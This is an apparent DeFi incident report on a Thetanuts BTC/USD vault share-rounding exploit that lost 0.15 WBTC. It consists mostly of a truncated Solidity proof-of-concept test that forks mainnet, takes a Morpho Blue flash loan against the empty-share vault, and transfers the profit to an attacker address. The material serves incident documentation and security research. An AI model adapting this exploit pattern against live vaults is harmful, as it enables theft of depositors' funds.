# [?] ThetanutsVaultShareRounding - Vault Share Rounding Manipulation

## Summary
Severity: Unknown
Chain: Ethereum
Component: ThetanutsVaultShareRounding
Published: 2026-04-20
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/ThetanutsVaultShareRounding_exp.sol
Type: defi-exploit-poc

## Details
Lost: 0.15 WBTC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant wbtc = IERC20(WBTC);
    IThetanutsVault private constant vault = IThetanutsVault(THETANUTS_BTC_USD_VAULT);
    IMorphoBuleFlashLoan private constant morpho = IMorphoBuleFlashLoan(MORPHO_BLUE);

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = WBTC;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(MORPHO_BLUE, "Morpho Blue");
        vm.label(WBTC, "WBTC");
        vm.label(THETANUTS_BTC_USD_VAULT, "Thetanuts BTC/USD Vault");
    }

    function testExploit() public balanceLog {
        uint256 attackerBalanceBefore = wbtc.balanceOf(ATTACKER);
        uint256 preExistingVaultWbtc = wbtc.balanceOf(THETANUTS_BTC_USD_VAULT);
        assertGt(preExistingVaultWbtc, 0, "vault already holds WBTC");
        assertEq(vault.totalSupply(), 0, "vault has zero shares before exploit");
        assertEq(vault.balanceOf(address(this)), 0, "local attacker starts without vault shares");
        assertEq(vault.balanceOf(HISTORICAL_ATTACK_CONTRACT), 0, "historical attack contract starts without shares");

        wbtc.approve(THETANUTS_BTC_USD_VAULT, type(uint256).max);
        wbtc.approve(MORPHO_BLUE, type(uint256).max);

        // step 1: borrow WBTC from Morpho; Morpho calls onMorphoFlashLoan.
        morpho.flashLoan(WBTC, FLASH_LOAN_AMOUNT, "");

        uint256 profit = wbtc.balanceOf(address(this));

        // step 5: forward the same final WBTC profit to the attacker EOA.
        wbtc.transfer(ATTACKER, profit);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/ThetanutsVaultShareRounding_exp.sol_
